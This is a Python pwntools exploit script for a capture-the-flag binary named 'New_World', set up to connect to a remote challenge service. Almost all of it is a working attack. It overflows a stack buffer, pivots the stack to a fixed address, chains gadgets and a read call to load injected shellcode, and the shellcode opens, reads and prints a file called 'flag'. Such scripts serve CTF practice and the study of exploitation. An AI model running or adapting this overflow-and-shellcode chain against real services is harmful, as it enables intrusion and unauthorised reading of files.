#!/usr/bin/env python3
# Date: 2026-05-23 20:53:46

from kk import *

context.binary = "./New_World"
context.log_level = "debug"
# context.timeout = 5

elf = ELF("./New_World")
rop = ROP(elf)
# libc = ELF('')


def go():
    if args.KK or args.REMOTE:
        return remote("192.168.127.12", 10001)
    else:
        return process(elf.path)


io = go()

stop = pause
S = pause
leak = lambda name, address: log.info("{} ===> {}".format(name, hex(address)))
s = io.send
sl = io.sendline
sla = io.sendlineafter
sa = io.sendafter
slt = io.sendlinethen
st = io.sendthen
r = io.recv
rn = io.recvn
rr = io.recvregex
ru = io.recvuntil
ra = io.recvall
rl = io.recvline
rs = io.recvlines
rls = io.recvline_startswith
rle = io.recvline_endswith
rlc = io.recvline_contains
ia = io.interactive
ic = io.close
cr = io.can_recv


def cmd(i, prompt="Your choice :"):
    sla(prompt, str(i))


def add():
    cmd(1)


def edit():
    cmd(2)


def show():
    cmd(3)


def dele():
    cmd(4)


def pwn():
    if args.GDB:
        GDB(io, "vmmap\nb init\nc")

    # ================= 你的利用代码写这里 =================
    New_World = elf.symbols["New_World"]
    read_plt = elf.plt["read"]
    leak("New_World", New_World)
    leak("read_plt", read_plt)

    pop_r14 = """
    pop r14
    ret
    """

    mov_rsi = """
    mov rsi,r14
    ret
    """

    read = """
    mov rdi,0
    mov rsi,0x1337040
    mov rdx,0x1000
    xor eax,eax
    syscall
    ret
    """

    shellcode = '''
    push 0x67616c66   #/* "flag"  ASCII string *
    mov rdi, rsp            
    xor esi, esi            
    xor edx, edx         
    push 2
    pop rax               
    syscall

    #/* read*/
    mov rdi, rax         
    mov rsi, rsp         
    mov dx, 0x100          
    xor eax, eax            
    syscall
    
    # /* write */
    mov edi, 1              
    mov rdx, rax            
    push 1
    pop rax               
    syscall
    '''
    
    print(len(shellcode))  #487

    ru(b"Welcome to the New World!")
    s(asm(pop_r14))

    ru(b"Do you want to stay in the new world? (y/no)")
    s(b"y")

    ru(b"Stop your footsteps, stop...Stop..........")
    payload = b"A" * 0x48 + p64(0x1337000) * 2 + p64(New_World)
    s(payload)

    ru(b"Welcome to the New World!")
    s(asm(mov_rsi))

    ru(b"Do you want to stay in the new world? (y/no)")
    s(b"y")

    ru(b"Stop your footsteps, stop...Stop..........")
    payload = b"A" * 0x48 + p64(0x1337000) + p64(read_plt) + p64(New_World)
    s(payload)

    payload = b"a" * 0x10 + asm(read)
    s(payload)

    ru(b"Welcome to the New World!")
    s(b"a")

    ru(b"Do you want to stay in the new world? (y/no)")
    s(b"y")

    ru(b"Stop your footsteps, stop...Stop..........")
    payload = b"A" * 0x48 + p64(0x1337010) + p64(0x1337040)
    s(payload)

    s(asm(shellcode))
    # s()
    # ======================================================

    ia()


if __name__ == "__main__":
    pwn()
